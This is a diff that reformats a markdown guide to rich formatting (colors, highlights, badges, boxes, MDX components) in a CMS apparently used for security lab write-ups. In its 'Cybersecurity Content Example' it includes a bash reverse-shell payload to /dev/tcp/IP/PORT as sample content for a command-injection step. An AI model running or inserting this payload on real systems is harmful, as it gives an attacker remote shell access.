@@ -5,6 +5,7 @@ Your Tailblaze CMS now supports rich formatting! Here's how to add colors, highl
 ## 🎨 **Colored Text**
 
 ### Method 1: Using HTML in Markdown
+
 ```html
 <span style="color: red;">This text is red</span>
 <span style="color: #3B82F6;">This text is blue</span>
@@ -12,6 +13,7 @@ Your Tailblaze CMS now supports rich formatting! Here's how to add colors, highl
 ```
 
 ### Method 2: Using Tailwind Classes
+
 ```html
 <span class="text-red-600 font-bold">Bold red text</span>
 <span class="text-blue-500 underline">Blue underlined text</span>
@@ -19,6 +21,7 @@ Your Tailblaze CMS now supports rich formatting! Here's how to add colors, highl
 ```
 
 ### Method 3: Using Custom Components (MDX)
+
 ```jsx
 <ColoredText color="red">This text is red</ColoredText>
 <ColoredText color="blue">This text is blue</ColoredText>
@@ -32,6 +35,7 @@ Your Tailblaze CMS now supports rich formatting! Here's how to add colors, highl
 ```
 
 Using component:
+
 ```jsx
 <Highlight>This is highlighted text</Highlight>
 ```
@@ -43,6 +47,7 @@ Using component:
 ```
 
 Using component:
+
 ```jsx
 <Badge>Important</Badge>
 ```
@@ -59,9 +64,7 @@ Using component:
 ## 📝 **Custom Boxes**
 
 ```jsx
-<Box>
-This content is in a styled box with border and background
-</Box>
+<Box>This content is in a styled box with border and background</Box>
 ```
 
 ## 💻 **Inline Code with Colors**
@@ -71,6 +74,7 @@ This content is in a styled box with border and background
 ```
 
 Using component:
+
 ```jsx
 <InlineCode>styled code</InlineCode>
 ```
@@ -85,30 +89,38 @@ Using component:
 ## 🚀 **Advanced Styling Examples**
 
 ### Cybersecurity Content Example:
+
 ```html
 <Alert type="warning">
-<strong>⚠️ Security Alert:</strong> This vulnerability has a <span class="text-red-600 font-bold">CRITICAL</span> severity rating.
+  <strong>⚠️ Security Alert:</strong> This vulnerability has a
+  <span class="text-red-600 font-bold">CRITICAL</span> severity rating.
 </Alert>
 
 <Box>
-<h4 class="text-blue-600 font-semibold">Exploitation Steps:</h4>
-<ol>
-<li>Identify the <InlineCode>command injection</InlineCode> point</li>
-<li>Craft payload: <code class="bg-red-100 text-red-800 px-1 rounded">bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'</code></li>
-<li>Execute and gain <Highlight>reverse shell</Highlight></li>
-</ol>
+  <h4 class="text-blue-600 font-semibold">Exploitation Steps:</h4>
+  <ol>
+    <li>Identify the <InlineCode>command injection</InlineCode> point</li>
+    <li>
+      Craft payload:
+      <code class="bg-red-100 text-red-800 px-1 rounded"
+        >bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'</code
+      >
+    </li>
+    <li>Execute and gain <Highlight>reverse shell</Highlight></li>
+  </ol>
 </Box>
 ```
 
 ### Machine Info Box:
+
 ```html
 <div class="bg-gray-50 border-l-4 border-blue-500 p-4 mb-4">
-<h4 class="text-blue-600 font-semibold mb-2">🖥️ Lab Information</h4>
-<ul class="space-y-1">
-<li><strong>Machine Name:</strong> <span class="text-green-600 font-mono">Vanity</span></li>
-<li><strong>Platform:</strong> <span class="text-blue-600">Proving Grounds Practice</span></li>
-<li><strong>Difficulty:</strong> <Badge>Intermediate</Badge></li>
-</ul>
+  <h4 class="text-blue-600 font-semibold mb-2">🖥️ Lab Information</h4>
+  <ul class="space-y-1">
+    <li><strong>Machine Name:</strong> <span class="text-green-600 font-mono">Vanity</span></li>
+    <li><strong>Platform:</strong> <span class="text-blue-600">Proving Grounds Practice</span></li>
+    <li><strong>Difficulty:</strong> <Badge>Intermediate</Badge></li>
+  </ul>
 </div>
 ```
 
